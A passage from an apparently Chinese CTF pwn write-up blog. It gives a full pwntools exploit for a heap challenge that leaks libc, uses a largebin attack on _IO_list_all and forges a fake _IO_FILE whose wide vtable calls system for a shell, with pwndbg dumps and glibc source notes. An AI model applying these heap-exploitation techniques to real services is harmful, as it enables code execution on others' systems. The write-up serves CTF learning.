class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./vuln&quot;</span>)<br>libc = elf.libc<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">indx, size</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">indx, content</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br>	io.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">indx</span>):<br>	io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>	io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>, <span class="hljs-built_in">str</span>(indx))<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x508</span>)<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x530</span>)<br><br>show(<span class="hljs-number">2</span>)<br>largebin = u64(io.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = largebin - (<span class="hljs-number">0xb030</span>-<span class="hljs-number">0xab90</span>) - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;lgbin=&#x27;</span>+<span class="hljs-built_in">hex</span>(largebin))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;base=&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>)<br>show(<span class="hljs-number">2</span>)	<span class="hljs-comment"># 修改了chunk2的fd&amp;bk 导致从largebin中脱离 此时chunk2变成了malloc状态</span><br>io.recvuntil(<span class="hljs-string">b&#x27;b&#x27;</span>)<br>chunk2 = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;chunk2=&quot;</span>+<span class="hljs-built_in">hex</span>(chunk2))<br><br><span class="hljs-comment"># edit(2, p64(largebin)*2) # 后面也改了 这不写也能通</span><br><br>_IO_all_list = libc_base + <span class="hljs-number">0x1e45c0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;_IO_all_list&#x27;</span>+<span class="hljs-built_in">hex</span>(_IO_all_list))<br><br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># largebin attack  add(5)后将chunk0插入largebin中 导致IO_all_list位置被修改成chunk0的地址</span><br>payload = p64(largebin)*<span class="hljs-number">2</span> <br>payload += p64(chunk2) + p64(_IO_all_list-<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">2</span>, payload)<br><br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x550</span>)<br><br>chunk0 = chunk2 - <span class="hljs-number">0xa30</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;chunk0=&#x27;</span>+<span class="hljs-built_in">hex</span>(chunk0))<br><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x500</span>) + p32(<span class="hljs-number">0xfffff7f5</span>) + <span class="hljs-string">b&#x27;;sh\x00&#x27;</span>)<span class="hljs-comment"># flag字段设置为0x68733bfffff7f5</span><br>fake_io_file = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>) <span class="hljs-comment"># _IO_write_base=1，_IO_write_ptr=2  （好像只要前&lt;后就能打通</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(chunk0+<span class="hljs-number">0x100</span>) <span class="hljs-comment"># _wide_data</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xc0</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0xffffffffffffffff</span>) <span class="hljs-comment"># _mode=-1</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0xd8</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libc_base+<span class="hljs-number">0x1e4f80</span>) <span class="hljs-comment"># vtable改为_IO_wfile_jumps</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0x100</span>-<span class="hljs-number">0x10</span> + <span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(chunk0+<span class="hljs-number">0x200</span>) <span class="hljs-comment"># _wide_data-&gt;_wide_vtable改为可控地址</span><br>fake_io_file = fake_io_file.ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">13</span> + p64(system) <span class="hljs-comment"># _wide_data-&gt;_wide_vtable-&gt;doallocate改为system</span><br>edit(<span class="hljs-number">0</span>, fake_io_file)<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># pause()</span><br><br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># delete(2)进入largebin中</span><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x55e7f0e171d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x7f3d1e11c030</span> <span class="hljs-string">&#x27;largebin&#x27;</span><br>bk: <span class="hljs-number">0x7f3d1e11c030</span> <span class="hljs-string">&#x27;largebin&#x27;</span><br>fd_nextsize: <span class="hljs-number">0x55e7f0e171d0</span><br>bk_nextsize: <span class="hljs-number">0x55e7f0e171d0</span><br>-------------------------------------------------------<br><span class="hljs-comment"># delete(0)进入unsortedbin 修改chunk2的结构</span><br>Free chunk (unsortedbin) | PREV_INUSE  <span class="hljs-comment"># chunk0</span><br>Addr: <span class="hljs-number">0x55884f4957a0</span><br>Size: <span class="hljs-number">0x520</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x521</span>)<br>fd: <span class="hljs-number">0x7f14523f2c00</span><br>bk: <span class="hljs-number">0x7f14523f2c00</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x55884f495cc0</span><br>Size: <span class="hljs-number">0x510</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x510</span>)<br><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x55884f4961d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x7f14523f3030</span><br>bk: <span class="hljs-number">0x7f14523f3030</span><br>fd_nextsize: <span class="hljs-number">0x55884f4961d0</span><br>bk_nextsize: <span class="hljs-number">0x7f14523f35a0</span> <span class="hljs-comment"># 指向_IO_all_list-0x20</span><br>-------------------------------------------------------<br><span class="hljs-comment"># chunk0进入largebin</span><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk0</span><br>Addr: <span class="hljs-number">0x562b142f37a0</span><br>Size: <span class="hljs-number">0x520</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x521</span>)<br>fd: <span class="hljs-number">0x7f6f7bb72030</span><br>bk: <span class="hljs-number">0x562b142f41d0</span><br>fd_nextsize: <span class="hljs-number">0x562b142f41d0</span><br>bk_nextsize: <span class="hljs-number">0x7f6f7bb725a0</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x562b142f3cc0</span><br>Size: <span class="hljs-number">0x510</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x510</span>)<br><br>Free chunk (largebins) | PREV_INUSE <span class="hljs-comment"># chunk2</span><br>Addr: <span class="hljs-number">0x562b142f41d0</span><br>Size: <span class="hljs-number">0x530</span> (<span class="hljs-keyword">with</span> flag bits: <span class="hljs-number">0x531</span>)<br>fd: <span class="hljs-number">0x562b142f37a0</span><br>bk: <span class="hljs-number">0x7f6f7bb72030</span><br>fd_nextsize: <span class="hljs-number">0x562b142f41d0</span><br>bk_nextsize: <span class="hljs-number">0x562b142f37a0</span>  <br><br><span class="hljs-comment"># 此时_IO_list_all写上了chunk0的地址   </span><br>pwndbg&gt; tele <span class="hljs-number">0x7f90cf3655a0</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│  <span class="hljs-number">0x7f90cf3655a0</span> (_nl_global_locale+<span class="hljs-number">224</span>) —▸ <span class="hljs-number">0x7f90cf330e18</span> (_nl_C_name) ◂— <span class="hljs-number">0x636d656d5f5f0043</span> /* <span class="hljs-string">&#x27;C&#x27;</span> */<br>01:0008│  <span class="hljs-number">0x7f90cf3655a8</span> ◂— <span class="hljs-number">0x0</span><br><span class="hljs-meta">... </span>↓     <span class="hljs-number">2</span> skipped<br>04:0020│  <span class="hljs-number">0x7f90cf3655c0</span> (_IO_list_all) —▸ <span class="hljs-number">0x55d06cf147a0</span> ◂— <span class="hljs-number">0x0</span><br>05:0028│  <span class="hljs-number">0x7f90cf3655c8</span> ◂— <span class="hljs-number">0x0</span><br>---------------------------------------------<br><span class="hljs-comment"># 写fake_IO_file</span><br>pwndbg&gt; p *_IO_list_all<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = -<span class="hljs-number">2059</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x521</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x521</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x0</span>,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_ptr = <span class="hljs-number">0x2</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x2</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x5640c53968a0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7f487ed49f80</span> &lt;_IO_wfile_jumps&gt;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<ul>
<li><p>但是问题是我看hollk师傅源码解读是只有后释放的chunk_size（即chunk0）大于先进largebin的才会有largebin attack呀 但这的chunk0_size&lt;chunk2_size，不懂为啥还能写：因为libc的版本不一样了 你看看how2heap就知道2.32的是需要malloc一个小的 具体的解释可能需要看看源码了  （by the way how2heap真的很有用</p>
</li>
<li><p>_mode的设置为-1的作用和flag那具体怎么写能getshell的：<br>glibc源码中IO_file结构体的位置在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.32/source">&#x2F;</a><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio">libio</a>&#x2F;<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits">bits</a>&#x2F;<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits/types">types</a>&#x2F;<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.32/source/libio/bits/types/struct_FILE.h">struct_FILE.h</a></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) <span class="hljs-comment">// _mode write_ptr   write_base字段的设置</span><br>	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>	   )<br>	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//here to call the function</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>if内即为拉起宏调用所需条件<br>注意如果欲控制rdi获得shell，_flag需要为<br>b’ sh;’ + p64((~(2 | 0x8 | 0x800))&amp;0xffffffffffffffff)</p>
<p>~(2 | 0x8 | 0x800)结果就是0xFFFFF7F5</p>
<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62172019/article/details/130757223">https://blog.csdn.net/qq_62172019/article/details/130757223</a></p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[*] Switching to interactive mode<br>sh: 1: \xf5\xf7\xff\xff: not found<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"> </span><br></code></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>官方WP应该是没用house of  但有个_mp结构体</p>
</li>
</ul>
<h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="pwn-3"><a href="#pwn-3" class="headerlink" title="pwn"></a>pwn</h3><h4 id="EldenRingFinal"><a href="#EldenRingFinal" class="headerlink" title="EldenRingFinal"></a>EldenRingFinal</h4><ul>
<li><p>啊懂了 因为是没有show函数的 所以需要利用_IO_2_1_stdout_或_IO_2_1_stderr_泄露libc 据说现在也比较常见了 然后就是一般来说是需要爆破的</p>
</li>
<li><pre><code class="c">// 2.23
struct _IO_FILE_plus
&#123;
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
&#125;;

struct _IO_FILE &#123;
  int _flags;		/* High-order word is _IO_MAGIC;     由libc固定，不同的libc可能存在差异，但基本都是0xfbad0000 rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;	/* Current read pointer */
  char* _IO_read_end;	/* End of get area. */
  char* _IO_read_base;	/* Start of putback+get area. */
  char* _IO_write_base;	/* Start of put area. */
  char* _IO_write_ptr;	/* Current put pointer. */
  char* _IO_write_end;	/* End of put area. */
  char* _IO_buf_base;	/* Start of reserve area. */
  char* _IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain; // IO_list_all--&gt;stderr(.chain)--&gt;stdout(.chain)--&gt;stdin

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it&#39;s too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs xl"><br>```c<br>#include <span class="hljs-string">&quot;libioP.h&quot;</span><br>#include &lt;string.h&gt;<br>#include &lt;limits.h&gt;<br><br>int<br>_IO_puts (const char *str)<br>&#123;<br>  int result = EOF;<br>  _IO_size_t len = strlen (str);<br>  _IO_acquire_lock (_IO_stdout);<br><br>  <span class="hljs-keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="hljs-number">0</span><br>       || _IO_fwide (_IO_stdout, -<span class="hljs-number">1</span>) == -<span class="hljs-number">1</span>)<br>      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len   <span class="hljs-comment">// _IO_sputn是一个宏，作用是调用_IO_2_1_stdout_中的vtable所指向的_xsputn</span><br>      &amp;&amp; _IO_putc_unlocked (<span class="hljs-string">&#x27;\n&#x27;</span>, _IO_stdout) != EOF)<br>    result = MIN (INT_MAX, len + <span class="hljs-number">1</span>);<br><br>  _IO_release_lock (_IO_stdout);<br>  return result;<br>&#125;<br><br>#ifdef weak_alias<br>weak_alias (_IO_puts, puts)<br>#endif<br>    <br>    <br>_IO_size_t<br>_IO_new_file_xsputn (_IO_FILE *f, const void *<span class="hljs-keyword">data</span>, _IO_size_t n)<br>&#123;<br>  const char *s = (const char *) <span class="hljs-keyword">data</span>;<br>  _IO_size_t to_do = n;<br>  int must_flush = <span class="hljs-number">0</span>;<br>  _IO_size_t count = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-keyword">if</span> (n &lt;= <span class="hljs-number">0</span>)<br>    return <span class="hljs-number">0</span>;<br>  <span class="hljs-comment">/* This is an optimized implementation.</span><br><span class="hljs-comment">     If the amount to be written straddles a block boundary</span><br><span class="hljs-comment">     (or the filebuf is unbuffered), use sys_write directly. */</span><br><br>  <span class="hljs-comment">/* First figure out how much space is available in the buffer. */</span><br>  <span class="hljs-function"><span class="hljs-title">if</span> ((f-&gt;</span>_<span class="hljs-function"><span class="hljs-title">flags</span> &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;</span>_flags &amp; _IO_CURRENTLY_PUTTING))<br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">count</span> = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">buf_end</span> - f-&gt;</span>_IO_write_ptr;<br>      <span class="hljs-keyword">if</span> (count &gt;= n)<br>	&#123;<br>	  const char *p;<br>	  <span class="hljs-keyword">for</span> (p = s + n; p &gt; s; )<br>	    &#123;<br>	      <span class="hljs-keyword">if</span> (*--p == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>		&#123;<br>		  count = p - s + <span class="hljs-number">1</span>;<br>		  must_flush = <span class="hljs-number">1</span>;<br>		  break;<br>		&#125;<br>	    &#125;<br>	&#125;<br>    &#125;<br>  <span class="hljs-function"><span class="hljs-title">else</span> <span class="hljs-keyword">if</span> (f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_end</span> &gt; f-&gt;</span>_IO_write_ptr)<br>    <span class="hljs-function"><span class="hljs-title">count</span> = f-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_end</span> - f-&gt;</span>_IO_write_ptr; <span class="hljs-comment">/* Space available. */</span><br><br>  <span class="hljs-comment">/* Then fill the buffer. */</span><br>  <span class="hljs-keyword">if</span> (count &gt; <span 